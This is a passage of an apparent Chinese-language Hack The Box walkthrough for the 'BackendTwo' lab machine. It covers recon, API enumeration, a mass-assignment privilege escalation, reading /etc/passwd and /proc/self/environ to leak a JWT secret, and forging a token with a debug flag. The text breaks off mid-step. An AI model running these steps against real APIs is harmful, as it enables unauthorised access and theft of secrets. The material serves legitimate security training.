    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - BackendTwo</title>
    <link href="/post/HackTheBox-BackendTwo.html"/>
    <url>/post/HackTheBox-BackendTwo.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png" alt="BackendTwo"></p><h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-28 00:52:55 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.162                                    <br>Discovered open port 22/tcp on 10.10.11.162  <br>Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.11.162 -p80                              <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-28 08:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.162<br>Host is up (0.086s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    uvicorn<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (application/json).</span><br><span class="hljs-string">|_http-server-header: uvicorn</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|     content-type: text/plain; charset=utf-8</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     Invalid HTTP request received.</span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 404 Not Found</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:40 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 22</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;detail&quot;:&quot;Not Found&quot;&#125;</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:29 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 22</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;msg&quot;:&quot;UHC Api v2.0&quot;&#125;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 405 Method Not Allowed</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:35 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 31</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &#123;&quot;detail&quot;:&quot;Method Not Allowed&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 68.04 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.162 -p80</span><br></code></pre></td></tr></table></figure><p>一样的配方：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.11.162/                                        <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.11.162/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET        1l        3w       22c http://10.10.11.162/<br>401      GET        1l        2w       30c http://10.10.11.162/docs<br>200      GET        1l        1w       19c http://10.10.11.162/api<br>[<span class="hljs-comment">####################] - 2m     30000/30000   0s      found:3       errors:0      </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   235/s   http://10.10.11.162/ </span><br><br>Crazy:~/HackTheBox$ curl  http://10.10.11.162/docs<br><br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api  <br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:<span class="hljs-string">&quot;/v1&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1<br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:[<span class="hljs-string">&quot;/user&quot;</span>,<span class="hljs-string">&quot;/admin&quot;</span>]&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin/<br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/ <br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not Found&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/1<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;25d386cd-b808-4107-8d3a-4277a0443a6e&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@backendtwo.htb&quot;</span>,<span class="hljs-string">&quot;profile&quot;</span>:<span class="hljs-string">&quot;UHC Admin&quot;</span>,<span class="hljs-string">&quot;last_update&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1650987800991,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125;                                                                                                                                                 <br>razy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;crazyinside&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> | jq .<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   189  100   169  100    20    648     76 --:--:-- --:--:-- --:--:--   724<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;<br>  ]<br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span>|jq .  <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100    54  100     2  100    52      2     70  0:00:01 --:--:--  0:00:01    73<br>&#123;&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span>|jq .<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   121  100    69  100    52    269    202 --:--:-- --:--:-- --:--:--   472<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: <span class="hljs-string">&quot;The user with this username already exists in the system&quot;</span><br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl -s -X POST http://10.10.11.162/api/v1/user/login -d <span class="hljs-string">&quot;username=crazy@inside.htb&amp;password=Password1\!&quot;</span> |jq .<br>&#123;<br>  <span class="hljs-string">&quot;access_token&quot;</span>: <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQwMTI1LCJpYXQiOjE2NjE2NDg5MjUsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImE3ZDFjY2NiLTYxMzQtNGY5MS1hMTM1LTMzYjY2YTJkNjUzYiJ9.XS6iyI0_QBAmNK19K4VgY2X8DgwQmjqRPMLAcrzHl6Y&quot;</span>,<br>  <span class="hljs-string">&quot;token_type&quot;</span>: <span class="hljs-string">&quot;bearer&quot;</span><br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>这里的后端页面与backend是一样的，只是在功能API上更新了一些，不再可以随意更改管理员密码了，当查询其他用户信息时会鉴权，但是新出了一个编辑用户配置文件的API。<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828092318479.png" alt="image-20220828092318479"></p><p>有一个批量分配的漏洞。可以更改json格式存储用户信息的字段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/12<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;a7d1cccb-6134-4f91-a135-33b66a2d653b&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;crazy@inside.htb&quot;</span>,<span class="hljs-string">&quot;profile&quot;</span>:null,<span class="hljs-string">&quot;last_update&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1661648753362,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;id&quot;</span>:12&#125;  <br></code></pre></td></tr></table></figure><p>鉴权的字段我猜测是is_superuser，它是false，我需要将他改为true</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093139020.png" alt="image-20220828093139020"></p><p>返回了两百，好像是对了？</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093233594.png" alt="image-20220828093233594"></p><p>通过查询可以看到确实如此。这次是没有命令执行功能的，但是可以写文件：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093347726.png" alt="image-20220828093347726"></p><p>写文件最好的方式便是写ssh秘钥了。不过首先需要知道目标有哪些用户，读取文件API有提示说是base64_url编码文件名：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093815706.png" alt="image-20220828093815706"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094018621.png" alt="image-20220828094018621"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span> -s |jq .<br>&#123;<br>  <span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>能够被用来登录的普通用户应该是htb，而且没有现成的秘钥可读。但是当我尝试写文件，会像上次提示的一样，需要debug标志：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094628194.png" alt="image-20220828094628194"></p><p>一路谷歌顺藤摸瓜摸索到源码&#x2F;home&#x2F;htb&#x2F;app&#x2F;core&#x2F;config.py。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> AnyHttpUrl, BaseSettings, EmailStr, validator<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span>, <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Settings</span>(<span class="hljs-title class_ inherited__">BaseSettings</span>):<br>    API_V1_STR: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;/api/v1&quot;</span><br>    JWT_SECRET: <span class="hljs-built_in">str</span> = os.environ[<span class="hljs-string">&#x27;API_KEY&#x27;</span>]<br>    ALGORITHM: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;HS256&quot;</span><br><br>    <span class="hljs-comment"># 60 minutes * 24 hours * 8 days = 8 days</span><br>    ACCESS_TOKEN_EXPIRE_MINUTES: <span class="hljs-built_in">int</span> = <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># BACKEND_CORS_ORIGINS is a JSON-formatted list of origins</span><br>    <span class="hljs-comment"># e.g: &#x27;[&quot;http://localhost&quot;, &quot;http://localhost:4200&quot;, &quot;http://localhost:3000&quot;, \</span><br>    <span class="hljs-comment"># &quot;http://localhost:8080&quot;, &quot;http://local.dockertoolbox.tiangolo.com&quot;]&#x27;</span><br>    BACKEND_CORS_ORIGINS: <span class="hljs-type">List</span>[AnyHttpUrl] = []<br><br><span class="hljs-meta">    @validator(<span class="hljs-params"><span class="hljs-string">&quot;BACKEND_CORS_ORIGINS&quot;</span>, pre=<span class="hljs-literal">True</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">assemble_cors_origins</span>(<span class="hljs-params">cls, v: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">Union</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> v.startswith(<span class="hljs-string">&quot;[&quot;</span>):<br>            <span class="hljs-keyword">return</span> [i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v.split(<span class="hljs-string">&quot;,&quot;</span>)]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(v, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">str</span>)):<br>            <span class="hljs-keyword">return</span> v<br>        <span class="hljs-keyword">raise</span> ValueError(v)<br><br>    SQLALCHEMY_DATABASE_URI: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-string">&quot;sqlite:///uhc.db&quot;</span><br>    FIRST_SUPERUSER: EmailStr = <span class="hljs-string">&quot;root@ippsec.rocks&quot;</span>    <br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        case_sensitive = <span class="hljs-literal">True</span><br> <br><br>settings = Settings()<br></code></pre></td></tr></table></figure><p>它是从环境变量中读取API_KEY的。再尝试读取&#x2F;proc&#x2F;self&#x2F;environ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L3Byb2Mvc2VsZi9lbnZpcm9u&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:18117\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=ec98ffc73ac546b8a30f47a8d08cc16e\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>然后制作JWT令牌：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ python           <br>Python <span class="hljs-number">3.10</span><span class="hljs-number">.5</span> (main, Jun  <span class="hljs-number">8</span> <span class="hljs-number">2022</span>, 09:<span class="hljs-number">26</span>:<span class="hljs-number">22</span>) [GCC <span class="hljs-number">11.3</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> jwt<br><span class="hljs-meta">&gt;&gt;&gt; </span>token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>key = <span class="hljs-string">&quot;68b329da9893e34099c7d8ad5cb9c940&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded = jwt.decode(token, key, [<span class="hljs-string">&quot;HS256&quot;</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded<br>&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;access_token&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>: <span class="hljs-number">1662341529</span>, <span class="hljs-string">&#x27;iat&#x27;</span>: <span class="hljs-number">1661650329</span>, <span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;is_superuser&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;guid&#x27;</span>: <span class="hljs-string">&#x27;a7d1cccb-6134-4f91-a135-33b66a2d653b&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded[<span class="hljs-string">&quot;debug&quot;</span>] = <span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>jwt.encode(decoded, key, <span class="hljs-string">&quot;HS256&quot;</span>)<br><span 